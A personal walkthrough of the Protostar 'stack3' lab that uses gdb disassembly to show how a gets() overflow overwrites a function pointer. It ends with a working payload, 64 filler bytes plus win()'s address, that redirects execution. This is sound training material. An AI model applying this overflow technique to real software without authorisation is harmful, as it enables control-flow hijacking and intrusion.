# For stack3 in Protostar

## Disassembly
Below is the disassembly dump of the `main` function.
I added the comments to explain the assembly code.
```
(gdb) disassemble main
Dump of assembler code for function main:
0x08048438 <main+0>:	push   ebp
0x08048439 <main+1>:	mov    ebp,esp
0x0804843b <main+3>:	and    esp,0xfffffff0
0x0804843e <main+6>:	sub    esp,0x60
0x08048441 <main+9>:	mov    DWORD PTR [esp+0x5c],0x0	;create null variable at esp+0x5c.
0x08048449 <main+17>:	lea    eax,[esp+0x1c]		; eax = esp + 0x1c.
0x0804844d <main+21>:	mov    DWORD PTR [esp],eax
0x08048450 <main+24>:	call   0x8048330 <gets@plt>	; char *destOfGets = eax.
0x08048455 <main+29>:	cmp    DWORD PTR [esp+0x5c],0x0	; check to make the null var is still null.
0x0804845a <main+34>:	je     0x8048477 <main+63>	; jump if null var is still null.
0x0804845c <main+36>:	mov    eax,0x8048560		; "calling function pointer, jumping to..."
0x08048461 <main+41>:	mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <main+45>:	mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:	mov    DWORD PTR [esp],eax	
0x0804846c <main+52>:	call   0x8048350 <printf@plt>	; prints string at memory location 0x8048560
0x08048471 <main+57>:	mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:	call   eax			; transfers code execution specified by esp+0x5.
0x08048477 <main+63>:	leave  
0x08048478 <main+64>:	ret    
End of assembler dump.
```
Based on the `main` function above, it seems the user supplied input is called at `0x8048475 <main+61>: call eax`.

I tried out the program in gdb to see if it was true.

## Program output
```
(gdb) start
Temporary breakpoint 3 at 0x8048441: file stack3/stack3.c, line 16.
Starting program: /opt/protostar/bin/stack3 

Temporary breakpoint 3, main (argc=1, argv=0xbffff754) at stack3/stack3.c:16
16	in stack3/stack3.c
0x08048441 <main+9>:	 c7 44 24 5c 00 00 00 00	mov    DWORD PTR [esp+0x5c],0x0
(gdb) c
Continuing.

Breakpoint 1, 0x08048450 in main (argc=1, argv=0xbffff754) at stack3/stack3.c:18
18	in stack3/stack3.c
0x08048450 <main+24>:	 e8 db fe ff ff	call   0x8048330 <gets@plt>
(gdb) ni
aaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbccccccccccccccccccccccccccccccccccccccccccccddddddddddddddddddddddddddddddddddeeeeeeeeeeeeeeeeeeeeeeeeffffffffffffffffffffffffgggggggggggggggggggggggg
20	in stack3/stack3.c
0x08048455 <main+29>:	 83 7c 24 5c 00	cmp    DWORD PTR [esp+0x5c],0x0
0x0804845a <main+34>:	 74 1b	je     0x8048477 <main+63>
(gdb) x/x $esp+0x5c
0xbffff69c:	0x63626262
(gdb) ni
0x0804845a	20	in stack3/stack3.c
0x0804845a <main+34>:	 74 1b	je     0x8048477 <main+63>
(gdb) 
21	in stack3/stack3.c
0x0804845c <main+36>:	 b8 60 85 04 08	mov    eax,0x8048560
0x08048461 <main+41>:	 8b 54 24 5c	mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <main+45>:	 89 54 24 04	mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:	 89 04 24	mov    DWORD PTR [esp],eax
0x0804846c <main+52>:	 e8 df fe ff ff	call   0x8048350 <printf@plt>
(gdb) 
0x08048461	21	in stack3/stack3.c
0x08048461 <main+41>:	 8b 54 24 5c	mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <main+45>:	 89 54 24 04	mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:	 89 04 24	mov    DWORD PTR [esp],eax
0x0804846c <main+52>:	 e8 df fe ff ff	call   0x8048350 <printf@plt>
(gdb) 
0x08048465	21	in stack3/stack3.c
0x08048465 <main+45>:	 89 54 24 04	mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:	 89 04 24	mov    DWORD PTR [esp],eax
0x0804846c <main+52>:	 e8 df fe ff ff	call   0x8048350 <printf@plt>
(gdb) 
0x08048469	21	in stack3/stack3.c
0x08048469 <main+49>:	 89 04 24	mov    DWORD PTR [esp],eax
0x0804846c <main+52>:	 e8 df fe ff ff	call   0x8048350 <printf@plt>
(gdb) 
0x0804846c	21	in stack3/stack3.c
0x0804846c <main+52>:	 e8 df fe ff ff	call   0x8048350 <printf@plt>
(gdb) 
calling function pointer, jumping to 0x63626262
22	in stack3/stack3.c
0x08048471 <main+57>:	 8b 44 24 5c	mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:	 ff d0	call   eax
(gdb) 
0x08048475	22	in stack3/stack3.c
0x08048475 <main+61>:	 ff d0	call   eax
(gdb) 
0x63626262 in ?? ()
0x63626262:	Cannot access memory at address 0x63626262
(gdb) 
```
As you can see above, the program tried to call an instruction at a location. That location `0x63626262` (ie *'bbbc'*), is taken from our input string.

So we now know that we can redirect the flow of the program by calling a function. But call what exactly? Let's find out what function it is we can call. Turns out it is the `win()` function.
```
(gdb) info functions
All defined functions:

File stack3/stack3.c:
int main(int, char **);
void win(void);
(gdb)
```

## Disassembly of win()
```
(gdb) disassemble win
Dump of assembler code for function win:
0x08048424 <win+0>:	push   ebp
0x08048425 <win+1>:	mov    ebp,esp
0x08048427 <win+3>:	sub    esp,0x18
0x0804842a <win+6>:	mov    DWORD PTR [esp],0x8048540
0x08048431 <win+13>:	call   0x8048360 <puts@plt>
0x08048436 <win+18>:	leave  
0x08048437 <win+19>:	ret    
End of assembler dump.
```

## Winning strategy and input

So all I had to do was to append the address of `win()` to the end of 64 `\x61`s. See below for the winning inputs.

```
user@protostar:~$ echo -e '\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x24\x84\x04\x08' > stack3input 
user@protostar:/opt/protostar/bin$ cat /home/user/stack3input | ./stack3 
calling function pointer, jumping to 0x08048424
code flow successfully changed
user@protostar:/opt/protostar/bin$ 
```

Game won. :)

---
  
### Just some extras for me to solve

 - Extras 1: Even though I entered the same winning input in GDB that gave me *"code flow successfully changed"* (see above), I got the following error in `__libc_start_main`. What does the error mean? And why did it come about when the same input run in stack3 directly did not get the same error.
```
(gdb) 
calling function pointer, jumping to 0x08048424
22	in stack3/stack3.c
0x08048471 <main+57>:	 8b 44 24 5c	mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:	 ff d0	call   eax
(gdb) 
0x08048475	22	in stack3/stack3.c
0x08048475 <main+61>:	 ff d0	call   eax
(gdb) 
code flow successfully changed
24	in stack3/stack3.c
0x08048477 <main+63>:	 c9	leave  
0x08048478 <main+64>:	 c3	ret    
(gdb) 
0x08048478 in main (argc=134513720, argv=0x1) at stack3/stack3.c:24
24	in stack3/stack3.c
0x08048478 <main+64>:	 c3	ret    
(gdb) 
__libc_start_main (main=0x8048438 <main>, argc=1, ubp_av=0xbffff754, init=0x8048490 <__libc_csu_init>, 
    fini=0x8048480 <__libc_csu_fini>, rtld_fini=0xb7ff1040 <_dl_fini>, stack_end=0xbffff74c)
    at libc-start.c:260
260	libc-start.c: No such file or directory.
	in libc-start.c
0xb7eadc76 <__libc_start_main+230>:	 89 04 24	mov    DWORD PTR [esp],eax
0xb7eadc79 <__libc_start_main+233>:	 e8 42 84 01 00	call   0xb7ec60c0 <*__GI_exit>
```
I found the following answer on this [GitHub issue](https://github.com/Microsoft/vscode-cpptools/issues/1123).
>This is "by design". After you return from main, the code belongs to the library code, in this case, libc-start.c, which is not available on your machine, unless you happened to have built the libc runtime you're using from the source. In generally, you shouldn't need to look at code that is not yours, so you can just ignore the pop about a missing file. In your example, you can put a breakpoint on the return 0, but you shouldn't need to step beyond that. 

In other words, I need not be alarmed at this "error". It's a normal thing. :)

END

